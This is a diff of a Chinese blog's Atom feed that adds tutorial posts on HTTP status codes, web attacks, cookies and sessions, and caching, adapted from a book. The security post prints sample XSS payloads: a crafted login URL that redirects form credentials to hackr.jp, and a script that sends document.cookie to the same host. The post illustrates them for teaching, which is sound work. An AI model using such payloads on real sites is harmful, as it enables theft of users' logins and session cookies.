@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://hubingliang.github.io</id>
     <title>Gridea</title>
-    <updated>2019-06-03T08:52:29.836Z</updated>
+    <updated>2019-06-03T09:08:28.438Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://hubingliang.github.io"/>
     <link rel="self" href="https://hubingliang.github.io/atom.xml"/>
@@ -40,6 +40,78 @@
 <p>未来，它一定会成为你离不开的伙伴</p>
 <p>尽情发挥你的才华吧！</p>
 <p>😘 Enjoy~</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[认识HTTP----状态码]]></title>
+        <id>https://hubingliang.github.io/post/status-code</id>
+        <link href="https://hubingliang.github.io/post/status-code">
+        </link>
+        <updated>2017-10-28T05:57:41.000Z</updated>
+        <content type="html"><![CDATA[<p><strong>本文内容大多参考<a href="https://book.douban.com/subject/25863515/">《图解HTTP》一书</a></strong></p>
+<h2 id="什么是状态码">什么是状态码？</h2>
+<p>当我们向服务端发送请求的时候，为了让用户更好的理解返回结果，通常要借助状态码来通知用户服务器端是正常处理了请求，还是出现了偏差。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-58f1c4215d05ea95.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="响应的状态码可描述请求的处理结果"></p>
+<p><strong>状态码如200 OK，以3 位数字和原因短语组成。</strong>
+<strong>数字中的第一位指定了响应类别，后两位无分类。响应类别有以下5 种。</strong></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-bf822bc144edc3e8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>状态码数量繁多，实际经常使用只有14多种，下面只介绍一下具有代表性的14 个状态码。</p>
+<h2 id="2xx-成功">2XX 成功</h2>
+<p>2XX 的响应结果表明请求被正常处理了。</p>
+<h3 id="200-ok">200 OK</h3>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-61676b0654a08ac5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>表示从客户端发来的请求在服务器端被正常处理了。</p>
+<h3 id="204-no-content">204 No Content</h3>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-f9d6fbcced90d307.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">
+该状态码代表服务器接收的请求已成功处理，但在返回的响应报文中不含实体的主体部分。另外，也不允许返回任何实体的主体。比如，当从浏览器发出请求处理后，返回204 响应，那么浏览器显示的页面不发生更新。
+一般在只需要从客户端往服务器发送信息，而对客户端不需要发送新信息内容的情况下使用。</p>
+<h3 id="206-partial-content">206 Partial Content</h3>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-3026ffedffa36572.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>该状态码表示客户端进行了范围请求，而服务器成功执行了这部分的GET 请求。响应报文中包含由Content-Range 指定范围的实体内容。</p>
+<h2 id="3xx重定向">3XX重定向</h2>
+<p>3XX 响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。</p>
+<h3 id="301-moved-permanently">301 Moved Permanently</h3>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-b1345d016e324c54.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>永久性重定向。该状态码表示请求的资源已被分配了新的URI，以后应使用资源现在所指的URI。</p>
+<h3 id="302-found">302 Found</h3>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-da317dbc465ef206.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>临时性重定向。该状态码表示请求的资源已被分配了新的URI，希望用户（本次）能使用新的URI 访问。
+和301 Moved Permanently 状态码相似，但302 状态码代表的资源不是被永久移动，只是临时性质的。换句话说，已移动的资源对应的URI 将来还有可能发生改变。</p>
+<h3 id="303-see-other">303 See Other</h3>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-42dfb7ef295639d6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>该状态码表示由于请求对应的资源存在着另一个URI，应使用GET方法定向获取请求的资源。
+303 状态码和302 Found 状态码有着相同的功能，但303 状态码明确表示客户端应当采用GET 方法获取资源，这点与302 状态码有区别。
+比如，当使用POST 方法访问CGI 程序，其执行后的处理结果是希望客户端能以GET 方法重定向到另一个URI 上去时，返回303 状态码。虽然302 Found 状态码也可以实现相同的功能，但这里使用303 状态码是最理想的。</p>
+<h3 id="304-not-modified">304 Not Modified</h3>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-e014430e6b091447.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">
+该状态码表示客户端发送附带条件的请求时，服务器端允许请求访问资源，但未满足条件的情况。304 状态码返回时，不包含任何响应的主体部分。304 虽然被划分在3XX 类别中，但是和重定向没有关系。</p>
+<h3 id="307-temporary-redirect">307 Temporary Redirect</h3>
+<p>临时重定向。该状态码与302 Found 有着相同的含义。尽管302 标准禁止POST 变换成GET，但实际使用时大家并不遵守。
+307 会遵照浏览器标准，不会从POST 变成GET。但是，对于处理响应时的行为，每种浏览器有可能出现不同的情况。</p>
+<h2 id="4xx-客户端错误">4XX 客户端错误</h2>
+<p>4XX 的响应结果表明客户端是发生错误的原因所在。</p>
+<h3 id="400-bad-request">400 Bad Request</h3>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-a76b87f7b3357e68.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">
+该状态码表示请求报文中存在语法错误。当错误发生时，需修改请求的内容后再次发送请求。另外，浏览器会像200 OK 一样对待该状态码。</p>
+<h3 id="401-unauthorized">401 Unauthorized</h3>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-fcd2dcebfb074152.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">
+该状态码表示发送的请求需要有通过HTTP 认证（BASIC 认证、DIGEST 认证）的认证信息。另外若之前已进行过1 次请求，则表示用户认证失败。
+返回含有401 的响应必须包含一个适用于被请求资源的WWWAuthenticate首部用以质询（challenge）用户信息。当浏览器初次接收到401 响应，会弹出认证用的对话窗口。</p>
+<h3 id="403-forbidden">403 Forbidden</h3>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-604eb2183c50e7d7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">
+该状态码表明对请求资源的访问被服务器拒绝了。服务器端没有必要给出拒绝的详细理由，但如果想作说明的话，可以在实体的主体部分对原因进行描述，这样就能让用户看到了。
+未获得文件系统的访问授权，访问权限出现某些问题（从未授权的发送源IP 地址试图访问）等列举的情况都可能是发生403 的原因。</p>
+<h3 id="404-not-found">404 Not Found</h3>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-1802cc9939aae6c4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>该状态码表明服务器上无法找到请求的资源。除此之外，也可以在服务器端拒绝请求且不想说明理由时使用。</p>
+<h2 id="5xx服务器错误">5XX服务器错误</h2>
+<p>5XX 的响应结果表明服务器本身发生错误。</p>
+<h3 id="500-internal-server-error">500 Internal Server Error</h3>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-beb418dab1c3dbba.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>该状态码表明服务器端在执行请求时发生了错误。也有可能是Web应用存在的bug 或某些临时的故障。</p>
+<h3 id="503-service-unavailable">503 Service Unavailable</h3>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-46134e7be9df6947.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">
+该状态码表明服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。如果事先得知解除以上状况需要的时间，最好写入Retry-After 首部字段再返回给客户端。</p>
 ]]></content>
     </entry>
     <entry>
@@ -96,6 +168,601 @@ document.write(`&lt;style&gt;${css}&lt;/style&gt;`)
 其中有多个解决方法的情况，使用了当下最优解来实现，之后发现了几个问题：有几个CSS技巧并没有成功--24、25、26</p>
 <p><img src="http://upload-images.jianshu.io/upload_images/4337988-0f3b302a547a08f4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">
 在书中给的参考网站也同样失效了.....如果有大佬知道如何实现欢迎提pull request</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[认识HTTP----Web安全与攻击手段]]></title>
+        <id>https://hubingliang.github.io/post/securi</id>
+        <link href="https://hubingliang.github.io/post/securi">
+        </link>
+        <updated>2017-09-09T03:38:05.000Z</updated>
+        <content type="html"><![CDATA[<p><strong>本文内容大多参考<a href="https://book.douban.com/subject/25863515/">《图解HTTP》一书</a></strong></p>
+<h2 id="关于web的攻击手段">关于Web的攻击手段</h2>
+<p>目前，互联网攻击大多是针对应用HTTP协议的服务器和客户端，以及运行在服务器上的Web应用等资源，本文主要针对Web应用的攻击技术进行简单分析。</p>
+<h3 id="针对web应用的攻击模式">针对Web应用的攻击模式</h3>
+<p>对Web应用的攻击模式有以下两种。</p>
+<ul>
+<li>主动攻击
+主动攻击（active attack）是指攻击者通过直接访问Web 应用，把攻击代码传入的攻击模式。由于该模式是直接针对服务器上的资源进行攻击，因此攻击者需要能够访问到那些资源。</li>
+</ul>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-3b2645de43c3de0c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="这个攻击者没法吐槽"></p>
+<ul>
+<li>被动攻击
+被动攻击（passive attack）是指利用圈套策略执行攻击代码的攻击模式。在被动攻击过程中，攻击者不直接对目标Web 应用访问发起攻击。
+被动攻击通常的攻击模式如下所示。</li>
+</ul>
+<ol>
+<li>攻击者诱使用户触发已设置好的陷阱，而陷阱会启动发送已嵌入攻击代码的HTTP 请求。</li>
+<li>当用户不知不觉中招之后，用户的浏览器或邮件客户端就会触发这个陷阱。</li>
+<li>中招后的用户浏览器会把含有攻击代码的HTTP 请求发送给作为攻击目标的Web 应用，运行攻击代码。</li>
+<li>执行完攻击代码，存在安全漏洞的Web 应用会成为攻击者的跳板，可能导致用户所持的Cookie 等个人信息被窃取，登录状态中的用户权限遭恶意滥用等后果。被动攻击模式中具有代表性的攻击是跨站脚本攻击（xss）和跨站点请求伪造（CSRF/XSRF）。</li>
+</ol>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-72423c77abb5909d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<h3 id="因输出值转义不完全引发的安全漏洞">因输出值转义不完全引发的安全漏洞</h3>
+<p>实施Web 应用的安全对策可大致分为以下两部分。</p>
+<ul>
+<li>客户端验证</li>
+<li>Web应用端（服务器）验证
+<ul>
+<li>输入值验证</li>
+<li>输出值转义</li>
+</ul>
+</li>
+</ul>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-511ebfb85ffa5947.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>多数情况下采用JavaScript 在客户端验证数据。可是在客户端允许篡改数据或关闭JavaScript，不适合将JavaScript 验证作为安全的防范对策。保留客户端验证只是为了尽早地辨识输入错误，起到提高UI 体验的作用。
+Web 应用端的输入值验证按Web 应用内的处理则有可能被误认为是具有攻击性意义的代码。输入值验证通常是指检查是否是符合系统业务逻辑的数值或检查字符编码等预防对策。
+从数据库或文件系统、HTML、邮件等输出Web 应用处理的数据之际，针对输出做值转义处理是一项至关重要的安全策略。当输出值转义不完全时，会因触发攻击者传入的攻击代码，而给输出对象带来损害。</p>
+<h2 id="跨站脚本攻击xss">跨站脚本攻击（XSS）</h2>
+<p>跨站脚本攻击（Cross-Site Scripting，XSS）是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或者Javascript的一种攻击。就这样，攻击者编写脚本设下陷阱，用户在自己的浏览器上运行时，一不小心就会受到被动攻击。
+跨站脚本攻击有可能造成以下影响：</p>
+<ul>
+<li>利用虚假输入表单骗取用户个人信息。</li>
+<li>利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求。</li>
+<li>显示伪造的文章或图片（莫名其妙的广告）。</li>
+</ul>
+<h3 id="简单例子">简单例子</h3>
+<p><strong>在动态生成HTML处发生：</strong></p>
+<p>下面以编辑个人信息页面为例讲解跨站脚本攻击。下方界面显示了用户输入的个人信息内容。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-f42a8f9323739e75.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="跨站脚本攻击案例"></p>
+<p>确认界面按原样显示在编辑界面输入的字符串。此处输入带有山口
+一郎这样的HTML 标签的字符串。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-ec25584204f71ee4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="按照输入内容原样显示的机制"></p>
+<p>此时的确认界面上，浏览器会把用户输入的<code>&lt;s&gt;</code> 解析成HTML 标签，然后显示删除线。
+删除线显示出来并不会造成太大的不利后果，但如果换成使用script 标签将会如何呢。</p>
+<h2 id="xss-是攻击者利用预先设置的陷阱触发的被动攻击">XSS 是攻击者利用预先设置的陷阱触发的被动攻击</h2>
+<p>跨站脚本攻击属于被动攻击模式，因此攻击者会事先布置好用于攻击的陷阱。
+下图网站通过地址栏中URI 的查询字段指定ID，即相当于在表单内自动填写字符串的功能。而就在这个地方，隐藏着可执行跨站脚本攻击的漏洞。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-23e6fa19d23f219e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">
+充分熟知此处漏洞特点的攻击者，于是就创建了下面这段嵌入恶意代码的URL。并隐藏植入事先准备好的欺诈邮件中或Web 页面内，诱使用户去点击该URL。</p>
+<pre><code>http://example.jp/login?ID=&quot;&gt;&lt;script&gt;var+f=document⇒
+.getElementById(&quot;login&quot;);+f.action=&quot;http://hackr.jp/pwget&quot;;+f.method=⇒
+&quot;get&quot;;&lt;/script&gt;&lt;span+s=&quot;
+</code></pre>
+<p>浏览器打开该URI 后，直观感觉没有发生任何变化，但设置好的脚本却偷偷开始运行了。当用户在表单内输入ID 和密码之后，就会直接发送到攻击者的网站（也就是hackr.jp），导致个人登录信息被窃取。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-d9c24bd7a2426f2b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>之后，ID 及密码会传给该正规网站，而接下来仍然是按正常登录步骤，用户很难意识到自己的登录信息已遭泄露。</p>
+<p><strong>对 http://example.jp/login?ID=yama 请求时对应的HTML源代码（摘录）</strong></p>
+<pre><code class="language-html">&lt;div class=&quot;logo&quot;&gt;
+![](/img/logo.gif)
+&lt;/div&gt;
+&lt;form action=&quot;http://example.jp/login&quot; method=&quot;post&quot; id=&quot;login&quot;&gt;
+&lt;div class=&quot;input_id&quot;&gt;
+ID &lt;input type=&quot;text&quot; name=&quot;ID&quot; value=&quot;yama&quot; /&gt;
+&lt;/div&gt;
+</code></pre>
+<pre><code class="language-html">**http://example.jp/login?ID=&quot;&gt;&lt;script&gt;var+f=document.getElementById
+(&quot;login&quot;);+f.action=&quot;http://hackr.jp/pwget&quot;;+f.method=&quot;get&quot;;&lt;/script&gt;
+&lt;span+s=&quot;对请求时对应的HTML源代码（摘录）**
+</code></pre>
+<pre><code class="language-html">&lt;div class=&quot;logo&quot;&gt;
+![](/img/logo.gif)
+&lt;/div&gt;
+&lt;form action=&quot;http://example.jp/login&quot; method=&quot;post&quot; id=&quot;login&quot;&gt;
+&lt;div class=&quot;input_id&quot;&gt;
+ID &lt;input type=&quot;text&quot; name=&quot;ID&quot; value=&quot;&quot;&gt;&lt;script&gt;var f=document⇒
+.getElementById(&quot;login&quot;); f.action=&quot;http://hackr.jp/pwget&quot;; f.method=⇒
+&quot;get&quot;;&lt;/script&gt;&lt;span s=&quot;&quot; /&gt;
+&lt;/div&gt;
+</code></pre>
+<h3 id="对用户cookie的窃取攻击">对用户Cookie的窃取攻击</h3>
+<p>除了在表单中设下圈套之外，下面那种恶意构造的脚本同样能够以跨站脚本攻击的方式，窃取到用户的Cookie 信息。
+<code>&lt;script src=http://hackr.jp/xss.js&gt;&lt;/script&gt;</code>
+该脚本内指定的http://hackr.jp/xss.js 文件。即下面这段采用JavaScript 编写的代码。</p>
+<pre><code class="language-js">var content = escape(document.cookie);
+document.write(&quot;&lt;img src=http://hackr.jp/?&quot;);
+document.write(content);
+document.write(&quot;&gt;&quot;);
+</code></pre>
+<p>在存在可跨站脚本攻击安全漏洞的Web 应用上执行上面这段JavaScript 程序，即可访问到该Web 应用所处域名下的Cookie 信息。然后这些信息会发送至攻击者的Web 网站（http://hackr.jp/），记录在他的登录日志中。结果，攻击者就这样窃取到用户的Cookie 信息了。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-73e389217a5eca2a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="使用XSS 攻击夺取Cookie 信息"></p>
+<h2 id="跨站点请求伪造csrf">跨站点请求伪造(CSRF)</h2>
+<p>跨站点请求伪造（Cross-Site Request Forgeries，CSRF）攻击是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。
+跨站点请求伪造有可能会造成以下等影响。</p>
+<ul>
+<li>利用已通过认证的用户权限更新设定信息等</li>
+<li>利用已通过认证的用户权限购买商品</li>
+<li>利用已通过认证的用户权限在留言板上发表言论</li>
+</ul>
+<h3 id="跨站点请求伪造的攻击案例">跨站点请求伪造的攻击案例</h3>
+<p>下面以留言板功能为例，讲解跨站点请求伪造。该功能只允许已认证并登录的用户在留言板上发表内容。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-aa8130ff059c20c4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="跨站点请求伪造的攻击案例"></p>
+<p>在该留言板系统上，受害者用户A 是已认证状态。它的浏览器中的Cookie 持有已认证的会话ID（步骤①）
+攻击者设置好一旦用户访问，即会发送在留言板上发表非主观行为产生的评论的请求的陷阱。用户A 的浏览器执行完陷阱中的请求后，留言板上也就会留下那条评论（步骤②）。
+触发陷阱之际，如果用户A 尚未通过认证，则无法利用用户A 的身份权限在留言板上发表内容。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[认识HTTP----Cookie和Session篇]]></title>
+        <id>https://hubingliang.github.io/post/cookie-session</id>
+        <link href="https://hubingliang.github.io/post/cookie-session">
+        </link>
+        <updated>2017-06-19T12:55:27.000Z</updated>
+        <content type="html"><![CDATA[<p><strong>本文内容大多参考<a href="https://book.douban.com/subject/25863515/">《图解HTTP》一书</a></strong></p>
+<h2 id="使用cookie来管理状态">使用Cookie来管理状态</h2>
+<p>HTTP是无状态协议，说明它不能以状态来区分和管理请求和响应。也就是说，无法根据之前的状态进行本次的请求处理。
+不可否认，无状态协议当然也有它的优点。由于不必保存状态，自然可减少服务器的CPU 及内存资源的消耗。从另一侧面来说，也正是因为HTTP 协议本身是非常简单的，所以才会被应用在各种场景里。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-87d0773cc92023ac.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="如果让服务器管理全部客户端状态则会成为负担"></p>
+<p>我们登录淘宝的时候首先要登录，我们看到了一个商品点进去，进行了页面跳转/刷新，按照HTTP的无状态协议岂不是又要登录一次？</p>
+<p>所以为了解决这个问题，Cookie诞生了，在保留无状态协议这个特征的同时又要解决类似记录状态的矛盾问题。Cookie 技术通过在请求和响应报文中写入Cookie 信息来控制客户端的状态。
+Cookie 会根据从服务器端发送的响应报文内的一个叫做Set-Cookie的首部字段信息，通知客户端保存Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入Cookie 值后发送出去。
+服务器端发现客户端发送过来的Cookie 后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到之前的状态信息。</p>
+<ul>
+<li>没有Cookie信息状态下的请求</li>
+</ul>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-59439fc716939f4b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<ul>
+<li>第2次以后（存有Cookie信息状态）的请求</li>
+</ul>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-27afc1005246361a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>上图很清晰地展示了发生Cookie 交互的情景。
+HTTP 请求报文和响应报文的内容如下（数字和图中对应）。</p>
+<ol>
+<li>请求报文（没有Cookie 信息的状态）</li>
+</ol>
+<pre><code>GET /reader/ HTTP/1.1
+Host: hackr.jp
+*首部字段内没有Cookie的相关信息
+</code></pre>
+<ol start="2">
+<li>响应报文（服务器端生成Cookie 信息）</li>
+</ol>
+<pre><code>HTTP/1.1 200 OK
+Date: Thu, 12 Jul 2012 07:12:20 GMT
+Server: Apache
+＜Set-Cookie: sid=1342077140226724; path=/; expires=Wed,10-Oct-12 07:12:20 GMT＞
+Content-Type: text/plain; charset=UTF-8
+</code></pre>
+<ol start="3">
+<li>请求报文（自动发送保存着的Cookie 信息）</li>
+</ol>
+<pre><code>GET /image/ HTTP/1.1
+Host: hackr.jp
+Cookie: sid=1342077140226724
+</code></pre>
+<h2 id="关于cookie-的首部字段">关于Cookie 的首部字段</h2>
+<table>
+<thead>
+<tr>
+<th>首部字段名</th>
+<th style="text-align:center">说明</th>
+<th style="text-align:right">首部类型</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Set-Cookie</td>
+<td style="text-align:center">开始状态管理所使用的Cookie信息</td>
+<td style="text-align:right">响应首部字段</td>
+</tr>
+<tr>
+<td>Cookie</td>
+<td style="text-align:center">服务器接收到的Cookie信息</td>
+<td style="text-align:right">请求首部字段</td>
+</tr>
+</tbody>
+</table>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-6f7ad5a2b69e3d8a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<h3 id="set-cookie">Set-Cookie</h3>
+<pre><code>Set-Cookie: status=enable; expires=Tue, 05 Jul 2011 07:26:31 GMT; ⇒
+path=/; domain=.hackr.jp;
+</code></pre>
+<p>当服务器准备开始管理客户端的状态时，会事先告知各种信息。下面的表格列举了Set-Cookie 的字段值。</p>
+<h3 id="set-cookie-字段的属性">Set-Cookie 字段的属性</h3>
+<table>
+<thead>
+<tr>
+<th>属性</th>
+<th style="text-align:center">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>NAME=VALUE</td>
+<td style="text-align:center">赋予Cookie的名称和其值（必需项）</td>
+</tr>
+<tr>
+<td>expires=DATE</td>
+<td style="text-align:center">Cookie的有效期（若不明确指定则默认为浏览器关闭前为止）</td>
+</tr>
+<tr>
+<td>path=PATH</td>
+<td style="text-align:center">将服务器上的文件目录作为Cookie的适用对象（若不指定则默认为文档所在的文件目录）</td>
+</tr>
+<tr>
+<td>domain=域名</td>
+<td style="text-align:center">作为Cookie适用对象的域名 （若不指定则默认为创建Cookie的服务器的域名）</td>
+</tr>
+</tbody>
+</table>
+<h4 id="expires-属性">expires 属性</h4>
+<p>Cookie 的expires 属性指定浏览器可发送Cookie 的有效期。当省略expires 属性时，Cookie仅在浏览器关闭之前有效。
+另外，一旦Cookie 从服务器端发送至客户端，服务器端就不存在可以显式删除Cookie 的方法。但可通过覆盖已过期的Cookie，实现对客户端Cookie 的实质性删除操作。</p>
+<h4 id="path-属性">path 属性</h4>
+<p>Cookie 的path 属性可用于限制指定Cookie 的发送范围的文件目录。不过另有办法可避开这项限制，看来对其作为安全机制的效果不能抱有期待。</p>
+<h4 id="domain-属性">domain 属性</h4>
+<p>通过Cookie 的domain 属性指定的域名可做到与结尾匹配一致。比如， 当指定example.com 后， 除example.com 以外，www.example.com或www2.example.com 等都可以发送Cookie。因此，除了针对具体指定的多个域名发送Cookie 之外，不指定domain 属性显得更安全。</p>
+<h4 id="secure-属性">secure 属性</h4>
+<p>Cookie 的secure 属性用于限制Web 页面仅在HTTPS 安全连接时，才可以发送Cookie。发送Cookie 时，指定secure 属性的方法如下所示。</p>
+<p><code>Set-Cookie: name=value; secure</code></p>
+<p>以上例子仅当在https ：//www.example.com/（HTTPS）安全连接的情况下才会进行Cookie 的回收。也就是说，即使域名相同时http : //www.example.com/（HTTP） 也不会发生Cookie 回收行为。当省略secure 属性时，不论HTTP 还是HTTPS，都会对Cookie 进行回收。</p>
+<h4 id="httponly-属性">HttpOnly 属性</h4>
+<p>Cookie 的HttpOnly 属性是Cookie 的扩展功能，它使JavaScript 脚本无法获得Cookie。其主要目的为防止跨站脚本攻击（Cross-sitescripting，XSS）对Cookie 的信息窃取。
+发送指定HttpOnly 属性的Cookie 的方法如下所示。</p>
+<p><code>Set-Cookie: name=value; HttpOnly</code></p>
+<p>通过上述设置，通常从Web 页面内还可以对Cookie 进行读取操作。但使用JavaScript 的document.cookie 就无法读取附加HttpOnly 属性后的Cookie 的内容了。因此，也就无法在XSS 中利用JavaScript 劫持Cookie 了。
+虽然是独立的扩展功能，但Internet Explorer 6 SP1 以上版本等当下的主流浏览器都已经支持该扩展了。另外顺带一提，该扩展并非是为了防止XSS 而开发的。</p>
+<h3 id="cookie">Cookie</h3>
+<p><code>Cookie: status=enable</code></p>
+<p>首部字段Cookie 会告知服务器，当客户端想获得HTTP 状态管理支持时，就会在请求中包含从服务器接收到的Cookie。接收到多个Cookie 时，同样可以以多个Cookie 形式发送。</p>
+<h2 id="session-管理及cookie-应用">Session 管理及Cookie 应用</h2>
+<h3 id="什么是session">什么是Session</h3>
+<p>在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。Session 对象最常见的一个用法就是存储用户的首选项。例如，如果用户指明不喜欢查看图形，就可以将该信息存储在 Session 对象中。</p>
+<h3 id="通过cookie来管理session">通过Cookie来管理Session</h3>
+<p>基于表单认证的标准规范尚未有定论，一般会使用Cookie 来管理Session（会话）。
+基于表单认证本身是通过服务器端的Web 应用，将客户端发送过来的用户ID 和密码与之前登录过的信息做匹配来进行认证的。
+但鉴于HTTP 是无状态协议，之前已认证成功的用户状态无法通过协议层面保存下来。即，无法实现状态管理，因此即使当该用户下一次继续访问，也无法区分他与其他的用户。于是我们会使用Cookie 来管理Session，以弥补HTTP 协议中不存在的状态管理功能。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-d8045757420dd652.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Session 管理及Cookie 状态管理"></p>
+<ul>
+<li><strong>步骤一</strong>：客户端把用户ID 和密码等登录信息放入报文的实体部分，通常是以POST 方法把请求发送给服务器。而这时，会使用HTTPS 通信来进行HTML 表单画面的显示和用户输入数据的发送。</li>
+<li><strong>步骤二</strong>：服务器会发放用以识别用户的Session ID。通过验证从客户端发送过来的登录信息进行身份认证，然后把用户的认证状态与Session ID 绑定后记录在服务器端。</li>
+</ul>
+<p>向客户端返回响应时，会在首部字段Set-Cookie 内写入Session ID（如PHPSESSID=028a8c…）。
+你可以把Session ID 想象成一种用以区分不同用户的等位号。然而，如果Session ID 被第三方盗走，对方就可以伪装成你的身份进行恶意操作了。因此必须防止Session ID 被盗，或被猜出。为了做到这点，Session ID 应使用难以推测的字符串，且服务器端也需要进行有效期的管理，保证其安全性。
+另外，为减轻跨站脚本攻击（XSS）造成的损失，建议事先在Cookie 内加上httponly 属性。</p>
+<ul>
+<li><strong>步骤三</strong>：客户端接收到从服务器端发来的Session ID 后，会将其作为Cookie 保存在本地。下次向服务器发送请求时，浏览器会自动发送Cookie，所以Session ID 也随之发送到服务器。服务器端可通过验证接收到的Session ID 识别用户和其认证状态。</li>
+</ul>
+<p>除了以上介绍的应用实例，还有应用其他不同方法的案例。
+另外，不仅基于表单认证的登录信息及认证过程都无标准化的方法，服务器端应如何保存用户提交的密码等登录信息等也没有标准化。
+通常，一种安全的保存方法是，先利用给密码加盐（salt）A 的方式增加额外信息，再使用散列（hash）函数计算出散列值后保存。但是我们也经常看到直接保存明文密码的做法，而这样的做法具有导致密码泄露的风险。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[认识HTTP----缓存篇]]></title>
+        <id>https://hubingliang.github.io/post/caching</id>
+        <link href="https://hubingliang.github.io/post/caching">
+        </link>
+        <updated>2017-06-18T05:07:05.000Z</updated>
+        <content type="html"><![CDATA[<p><strong>本文内容大多参考<a href="https://book.douban.com/subject/25863515/">《图解HTTP》一书</a></strong></p>
+<h2 id="认识代理服务器">认识代理服务器</h2>
+<p>所以讲缓存为什么要先扯代理服务器？别急，让我们看一下一个请求的简单示意图。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-2f83dd324ca06c63.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>我们看到客户端(用户)发送了一个请求并不是直接发给源服务器的而是经过了代理服务器，然后经由代理服务器再发送给源服务器，响应也同样遵循这个顺序。
+那么代理服务器在这中间担任了什么角色？</p>
+<h3 id="代理服务器的分类">代理服务器的分类</h3>
+<ul>
+<li>缓存代理
+代理转发响应时，缓存代理（Caching Proxy）会预先将资源的副本（缓存）保存在代理服务器上。当代理再次接收到对相同资源的请求时，就可以不从源服务器那里
